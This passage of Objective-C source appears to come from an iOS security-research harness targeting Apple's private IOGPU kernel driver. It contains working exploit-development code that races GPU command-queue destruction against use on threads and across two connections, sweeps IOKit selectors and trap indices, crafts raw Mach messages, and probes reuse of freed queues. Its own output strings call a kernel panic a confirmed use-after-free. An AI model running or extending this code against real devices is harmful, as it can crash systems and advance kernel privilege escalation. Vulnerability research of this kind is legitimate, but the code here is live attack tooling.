        void *q = pQueueCreate(dev, args, 0x410);
        free(args);
        if (!q) continue;
        uint32_t qid = pGetID ? pGetID(q) : 1;

        uint64_t ref[8] = {0};
        uint64_t inS_async[1] = { qid };
        uint32_t outCnt = 0;
        uint64_t outS[16] = {0};
        size_t outSize = 0;
        kern_return_t rc_async = pCallAsync(conn, 8, wakePort, ref, 0,
            inS_async, 1, NULL, 0, &outCnt, outS, &outSize, NULL);

        uint64_t inS_sync[1] = { qid };
        kern_return_t rc_use = pCall(conn, 16, inS_sync, 1, NULL, 0, NULL, 0, NULL, 0);

        if (rc_async == 0 && rc_use == 0) both2_ok++;
        else if (rc_async == 0) a8_ok++;
        else if (rc_use == 0) s16_ok++;
        else both2_fail++;

        {
            char buf[64];
            mach_msg((mach_msg_header_t *)buf, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(buf),
                     wakePort, 0, MACH_PORT_NULL);
        }
    }

    [out appendFormat:@"N=%d both_ok=%d async_sel8=%d sync_sel16=%d both_fail=%d\n",
        N, both2_ok, a8_ok, s16_ok, both2_fail];
    [out appendString:@"panic = UAF CONFIRMED.\n"];

cleanup:
    if (wakePort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), wakePort);
    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010PortDestructRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 port_destruct race -- sel=16 vs mach_port_destruct\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    // mach_port_mod_refs (proper API to release send right)
    typedef kern_return_t (*mach_port_mod_refs_t)(mach_port_t, mach_port_name_t, mach_port_right_t, mach_port_delta_t);
    mach_port_mod_refs_t pModRefs = dlsym(RTLD_DEFAULT, "mach_port_mod_refs");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    if (!pModRefs) { [out appendString:@"STOP no mach_port_mod_refs\n"]; return out; }

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }

    // Test: does mach_port_mod_refs work on a test conn?
    {
        void *dev0 = pDevCreate(svc);
        if (dev0) {
            io_connect_t c0 = pDevGetConn(dev0);
            kern_return_t rc_test = pModRefs(mach_task_self(), c0, MACH_PORT_RIGHT_SEND, -1);
            [out appendFormat:@"mod_refs test: conn=%u -> 0x%x\n", c0, rc_test];
            if (pDevRelease) pDevRelease(dev0);
        }
    }

    // Sweep usleep delays -- IOConnectCallMethod on main thread (blocks),
    // mach_port_mod_refs on background thread with delay
    int delays[] = {0, 1, 2, 5, 10, 50, 100};
    int num_delays = sizeof(delays) / sizeof(delays[0]);
    int N = 30;
    int total_use_ok = 0, total_destruct_ok = 0, total_both_fail = 0, total_hung = 0;

    for (int si = 0; si < num_delays; si++) {
        int delay = delays[si];
        int s_use_ok = 0, s_destruct_ok = 0, s_both_fail = 0, s_hung = 0;
        [out appendFormat:@"\n--- usleep=%d ---\n", delay];

        for (int i = 0; i < N; i++) {
            void *dev = pDevCreate(svc);
            if (!dev) continue;
            io_connect_t conn = pDevGetConn(dev);

            void *args = calloc(1, 0x410);
            *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
            *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
            void *q = pQueueCreate(dev, args, 0x410);
            free(args);
            if (!q) { if (pDevRelease) pDevRelease(dev); continue; }
            uint32_t qid = pGetID ? pGetID(q) : 1;

            __block kern_return_t rc_destruct = 0;

            // Background thread: release port after delay
            dispatch_async(dispatch_get_global_queue(0, 0), ^{
                if (delay > 0) usleep(delay);
                rc_destruct = pModRefs(mach_task_self(), conn, MACH_PORT_RIGHT_SEND, -1);
            });

            // Main thread: call sel=16 -- sends message, blocks for reply
            uint64_t s[1] = { qid };
            kern_return_t rc_use = pCall(conn, 16, s, 1, NULL, 0, NULL, 0, NULL, 0);
            // When we get here: either sel=16 completed, or port was killed

            if (rc_use == 0) s_use_ok++;
            else if (rc_destruct == 0) s_destruct_ok++;
            else s_both_fail++;
        }

        [out appendFormat:@"usleep=%d: use_ok=%d destruct_ok=%d both_fail=%d\n",
            delay, s_use_ok, s_destruct_ok, s_both_fail];
        total_use_ok += s_use_ok; total_destruct_ok += s_destruct_ok;
        total_both_fail += s_both_fail; total_hung += s_hung;
    }

    [out appendFormat:@"\nTotal: use_ok=%d destruct_ok=%d both_fail=%d\n",
        total_use_ok, total_destruct_ok, total_both_fail];
    [out appendString:@"panic = UAF CONFIRMED.\n"];

    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010FindMigId {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 find MIG ID -- try 2821/2863/2865\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    // Create queue so sel=16 has a valid target
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *q = pQueueCreate(dev, args, 0x410);
    free(args);
    uint32_t qid = (q && pGetID) ? pGetID(q) : 1;
    [out appendFormat:@"conn=%u qid=%u queue=%p\n", conn, qid, q];

    // Create reply port
    mach_port_t replyPort = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &replyPort);

    // Try 3 IDs with 2 formats each
    int ids[] = {2821, 2863, 2865};
    // Format A: old scalarI_scalarO (32-bit ints)
    // Head(28) + NDR(4) + selector(4) + inputCnt(4) + input[16]*4=64 + outputCnt(4) = 108
    // Format B: new io_connect_method (64-bit scalars, minimal)
    // Head(28) + NDR(4) + selector(4) + scalarCnt(4) + scalar[1]*8=8 + inbandCnt(4) = 52

    int fmtA_size = 108;
    int fmtB_size = 52; // minimal: just 1 scalar, no inband

    for (int ii = 0; ii < 3; ii++) {
        int tryId = ids[ii];

        // Format A: 32-bit ints (old scalarI_scalarO)
        {
            char *buf = calloc(1, fmtA_size);
            mach_msg_header_t *h = (mach_msg_header_t *)buf;
            h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
            h->msgh_size = fmtA_size;
            h->msgh_remote_port = conn;
            h->msgh_local_port = replyPort;
            h->msgh_id = tryId;
            buf[28] = 0; buf[29] = 0; buf[30] = 0; buf[31] = 0; // NDR
            *(uint32_t *)(buf + 32) = 16;  // selector
            *(uint32_t *)(buf + 36) = 1;  // inputCnt
            *(uint32_t *)(buf + 40) = qid; // input[0] (32-bit)
            *(uint32_t *)(buf + 104) = 0; // outputCnt

            mach_msg_return_t mr = mach_msg(h,
                MACH_SEND_MSG | MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                fmtA_size, fmtA_size + 128,
                replyPort, 1000, MACH_PORT_NULL);

            [out appendFormat:@"id=%d fmtA(32bit): 0x%x\n", tryId, mr];
            if (mr == MACH_MSG_SUCCESS) [out appendString:@" *** REPLY ***\n"];
            free(buf);
        }

        // Format B: 64-bit scalars (new io_connect_method, minimal)
        {
            char *buf = calloc(1, fmtB_size);
            mach_msg_header_t *h = (mach_msg_header_t *)buf;
            h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
            h->msgh_size = fmtB_size;
            h->msgh_remote_port = conn;
            h->msgh_local_port = replyPort;
            h->msgh_id = tryId;
            buf[28] = 0; buf[29] = 0; buf[30] = 0; buf[31] = 0; // NDR
            *(uint32_t *)(buf + 32) = 16;  // selector
            *(uint32_t *)(buf + 36) = 1;  // scalar_inputCnt
            *(uint64_t *)(buf + 40) = qid; // scalar_input[0] (64-bit)
            *(uint32_t *)(buf + 48) = 0; // inband_inputCnt

            mach_msg_return_t mr = mach_msg(h,
                MACH_SEND_MSG | MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                fmtB_size, fmtB_size + 128,
                replyPort, 1000, MACH_PORT_NULL);

            [out appendFormat:@"id=%d fmtB(64bit): 0x%x\n", tryId, mr];
            if (mr == MACH_MSG_SUCCESS) [out appendString:@" *** REPLY ***\n"];
            free(buf);
        }
    }

    // Verify with IOConnectCallMethod
    [out appendString:@"\n--- verify ---\n"];
    uint64_t s[1] = { qid };
    kern_return_t rc = pCall(conn, 16, s, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"IOConnectCallMethod sel=16 -> 0x%x\n", rc];

    mach_port_deallocate(mach_task_self(), replyPort);
    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010PostDestroySweep {
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p010pdsweep"];
    if (stop) return stop;
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 post-destroy sweep -- all sels after sel=8\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    // Create queue
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *q = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!q) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }
    uint32_t qid = pGetID ? pGetID(q) : 1;
    [out appendFormat:@"conn=%u qid=%u\n", conn, qid];

    // Baseline: sel=16 before destroy
    uint64_t s[1] = { qid };
    kern_return_t rc_before = pCall(conn, 16, s, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"sel=16 before destroy -> 0x%x\n", rc_before];

    // Destroy
    kern_return_t rc_destroy = pCall(conn, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"sel=8 destroy -> 0x%x\n", rc_destroy];

    // Sweep ALL selectors after destroy
    [out appendString:@"\n--- post-destroy selector sweep ---\n"];
    int nonBad = 0;
    for (int sel = 0; sel <= 40; sel++) {
        // Try with qid as scalar
        uint64_t ss[1] = { qid };
        kern_return_t rc = pCall(conn, sel, ss, 1, NULL, 0, NULL, 0, NULL, 0);
        if (rc != 0xe00002c2) {
            [out appendFormat:@"sel=%d scalar=qid -> 0x%x ***\n", sel, rc];
            nonBad++;
        }
        // Try with no input
        rc = pCall(conn, sel, NULL, 0, NULL, 0, NULL, 0, NULL, 0);
        if (rc != 0xe00002c2) {
            [out appendFormat:@"sel=%d empty -> 0x%x ***\n", sel, rc];
            nonBad++;
        }
        // Try with struct=128
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        rc = pCall(conn, sel, NULL, 0, inStruct, 128, NULL, 0, NULL, 0);
        if (rc != 0xe00002c2) {
            [out appendFormat:@"sel=%d struct=128 -> 0x%x ***\n", sel, rc];
            nonBad++;
        }
    }
    [out appendFormat:@"non-BadArg after destroy: %d\n", nonBad];

    // Also try: create a NEW queue (qid=2) and then call sel=16 with qid=1 (old freed)
    [out appendString:@"\n--- new queue + old qid access ---\n"];
    args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *q2 = pQueueCreate(dev, args, 0x410);
    free(args);
    if (q2) {
        uint32_t qid2 = pGetID ? pGetID(q2) : 2;
        [out appendFormat:@"new queue qid=%u\n", qid2];
        // Try old freed qid with sel=16
        uint64_t oldS[1] = { qid };
        kern_return_t rc_old = pCall(conn, 16, oldS, 1, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"sel=16 old qid=%u -> 0x%x\n", qid, rc_old];
        if (rc_old != 0xe00002c2) [out appendFormat:@" *** FOUND FREED QUEUE ***\n"];
    }

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010TrapTest {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 IOConnectTrap6 test -- bypass MIG\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    // IOConnectTrap6
    typedef kern_return_t (*IOConnectTrap6_t)(io_connect_t, uint32_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t);
    IOConnectTrap6_t pTrap6 = dlsym(iokit, "IOConnectTrap6");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    if (!pTrap6) { [out appendString:@"STOP no IOConnectTrap6\n"]; return out; }

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    // Create queue
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *q = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!q) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }
    uint32_t qid = pGetID ? pGetID(q) : 1;
    [out appendFormat:@"conn=%u qid=%u\n", conn, qid];

    // Verify: is IOConnectTrap6 real or a stub?
    [out appendString:@"\n--- trap6 reality check ---\n"];
    // Test with invalid conn=0
    kern_return_t rc0 = pTrap6(0, 0, 0, 0, 0, 0, 0, 0);
    [out appendFormat:@"trap6(conn=0) -> 0x%x %s\n", rc0, rc0 == 0 ? @"(STUB?)" : @"(real)"];
    // Test with valid conn but invalid index=999
    kern_return_t rc999 = pTrap6(conn, 999, 0, 0, 0, 0, 0, 0);
    [out appendFormat:@"trap6(index=999) -> 0x%x %s\n", rc999, rc999 == 0 ? @"(STUB?)" : @"(real)"];
    // Test with valid conn, valid index, but invalid args (0xDEAD)
    kern_return_t rc_dead = pTrap6(conn, 16, 0xDEAD, 0, 0, 0, 0, 0);
    [out appendFormat:@"trap6(index=16, arg=0xDEAD) -> 0x%x %s\n", rc_dead, rc_dead == 0 ? "(STUB?)" : "(real)"];
    for (uint32_t trap = 0; trap <= 30; trap++) {
        kern_return_t rc = pTrap6(conn, trap, 0, 0, 0, 0, 0, 0);
        if (rc != 0xe00002c2) {
            [out appendFormat:@"trap=%u -> 0x%x ***\n", trap, rc];
        }
    }

    // Test 2: try trap with qid as arg1
    [out appendString:@"\n--- trap6 with qid as arg1 ---\n"];
    for (uint32_t trap = 0; trap <= 30; trap++) {
        kern_return_t rc = pTrap6(conn, trap, qid, 0, 0, 0, 0, 0);
        if (rc != 0xe00002c2) {
            [out appendFormat:@"trap=%u arg1=qid -> 0x%x ***\n", trap, rc];
        }
    }

    // Test 3: compare IOConnectCallMethod sel=16 vs trap6
    [out appendString:@"\n--- compare sel=16 via method vs trap ---\n"];
    uint64_t s[1] = { qid };
    kern_return_t rc_method = pCall(conn, 16, s, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"method sel=16 -> 0x%x\n", rc_method];

    // Try each trap index 0-30 with qid and see if any returns 0x0 (same as method)
    for (uint32_t trap = 0; trap <= 30; trap++) {
        kern_return_t rc = pTrap6(conn, trap, qid, 0, 0, 0, 0, 0);
        if (rc == 0) {
            [out appendFormat:@"trap=%u -> 0x0 (MATCHES sel=16!) ***\n", trap];
        }
    }

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}



+ (NSString *)runP010MapMemory {
    return [self runP010TwoConnRaceV2];
}

+ (NSString *)runP010TwoConnRaceV2 {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 two-connection race v2\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
    IOServiceClose_t pSvcClose = dlsym(iokit, "IOServiceClose");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    [out appendString:@"=== Setup: two connections ===\n"];

    CFMutableDictionaryRef matching1 = pMatching("IOGPU");
    io_service_t svc1 = matching1 ? pGet(*pMainPort, matching1) : 0;
    if (!svc1) { [out appendString:@"STOP no svc1\n"]; return out; }
    void *dev1 = pDevCreate(svc1);
    if (!dev1) { [out appendString:@"STOP no dev1\n"]; pRelease(svc1); return out; }
    io_connect_t conn1 = pDevGetConn(dev1);
    [out appendFormat:@"conn1=%u\n", conn1];

    CFMutableDictionaryRef matching2 = pMatching("IOGPU");
    io_service_t svc2 = matching2 ? pGet(*pMainPort, matching2) : 0;
    if (!svc2) { [out appendString:@"STOP no svc2\n"]; pRelease(svc1); return out; }
    void *dev2 = pDevCreate(svc2);
    if (!dev2) { [out appendString:@"STOP no dev2\n"]; pRelease(svc1); pRelease(svc2); return out; }
    io_connect_t conn2 = pDevGetConn(dev2);
    [out appendFormat:@"conn2=%u\n", conn2];

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev1 + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev1 + 0x08);
    void *q = pQueueCreate(dev1, args, 0x410);
    free(args);
    if (!q) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev1); pDevRelease(dev2); pRelease(svc1); pRelease(svc2); return out; }
    uint32_t qid = pGetID ? pGetID(q) : 1;
    [out appendFormat:@"qid=%u\n", qid];

    [out appendString:@"\n=== Test: cross-conn queue access ===\n"];
    uint64_t sc[1] = { qid };
    kern_return_t rc_use2 = pCall(conn2, 16, sc, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"conn2 sel=16(qid) -> 0x%x\n", rc_use2];
    kern_return_t rc_dest2 = pCall(conn2, 8, sc, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"conn2 sel=8(qid) -> 0x%x\n", rc_dest2];

    int canCrossConn = (rc_use2 != 0xe00002c2 || rc_dest2 != 0xe00002c2);

    if (!canCrossConn) {
        [out appendString:@"Queue is PER-CONNECTION. Trying IOConnectAddClient...\n"];
        typedef kern_return_t (*IOConnectAddClient_t)(io_connect_t, io_connect_t);
        IOConnectAddClient_t pAddClient = dlsym(iokit, "IOConnectAddClient");
        if (pAddClient) {
            kern_return_t rc_add = pAddClient(conn1, conn2);
            [out appendFormat:@"IOConnectAddClient -> 0x%x\n", rc_add];
            rc_use2 = pCall(conn2, 16, sc, 1, NULL, 0, NULL, 0, NULL, 0);
            [out appendFormat:@"after add: conn2 sel=16 -> 0x%x\n", rc_use2];
            rc_dest2 = pCall(conn2, 8, sc, 1, NULL, 0, NULL, 0, NULL, 0);
            [out appendFormat:@"after add: conn2 sel=8 -> 0x%x\n", rc_dest2];
            canCrossConn = (rc_use2 != 0xe00002c2 || rc_dest2 != 0xe00002c2);
        }
    }

    if (canCrossConn) {
        [out appendString:@"\n=== RACE: conn1 sel=16 vs conn2 sel=8 ===\n"];
        [out appendString:@"10000 iterations. Panic = UAF CONFIRMED.\n\n"];

        int survived = 0;
        for (int iter = 0; iter < 10000; iter++) {
            args = calloc(1, 0x410);
            *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev1 + 0x08);
            *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev1 + 0x08);
            q = pQueueCreate(dev1, args, 0x410);
            free(args);
            if (!q) continue;
            qid = pGetID ? pGetID(q) : 1;

            __block dispatch_semaphore_t go = dispatch_semaphore_create(0);
            __block volatile int done = 0;
            __block kern_return_t rc_use = 0;
            __block kern_return_t rc_dest = 0;

            dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                dispatch_semaphore_wait(go, DISPATCH_TIME_FOREVER);
                uint64_t s[1] = { qid };
                rc_use = pCall(conn1, 16, s, 1, NULL, 0, NULL, 0, NULL, 0);
                done = 1;
            });

            dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                dispatch_semaphore_wait(go, DISPATCH_TIME_FOREVER);
                uint64_t s[1] = { qid };
                rc_dest = pCall(conn2, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
                done = 1;
            });

            dispatch_semaphore_signal(go);
            dispatch_semaphore_signal(go);

            for (int w = 0; w < 50 && !done; w++) usleep(100);

            if (iter % 2000 == 0) {
                [out appendFormat:@"iter %d: use=0x%x dest=0x%x\n", iter, rc_use, rc_dest];
            }
            survived++;
        }

        [out appendFormat:@"\nsurvived %d/10000. panic = UAF CONFIRMED.\n", survived];
    } else {
        [out appendString:@"\nCannot race: queue is per-connection.\n"];
        [out appendString:@"Next: try P001 AVE path or raw mach_msg.\n"];
    }

    pSvcClose(conn1);
    pSvcClose(conn2);
    if (pDevRelease) pDevRelease(dev1);
    if (pDevRelease) pDevRelease(dev2);
    pRelease(svc1);
    pRelease(svc2);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}




static void p001_encode_callback(void *refcon, void *src, OSStatus status, VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    OSStatus *out = (OSStatus *)refcon;
    *out = status;
}

+ (NSString *)runP001VTIntercept {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P009 SAME-TYPE REUSE TEST\n"];
    [out appendString:@"Question: does a new IOGPUResource reuse a freed resource's GPU page?\n\n"];

    void *metal = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
    // IOGPU is a PRIVATE framework on iOS -- must use PrivateFrameworks path
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) {
        // Fallback: try public framework path (may be a stub)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        NSLog(@"P009: PrivateFrameworks IOGPU dlopen failed, tried public: %p", iogpu);
    }
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    NSLog(@"P009: dlopen metal=%p iogpu=%p iokit=%p", metal, iogpu, iokit);

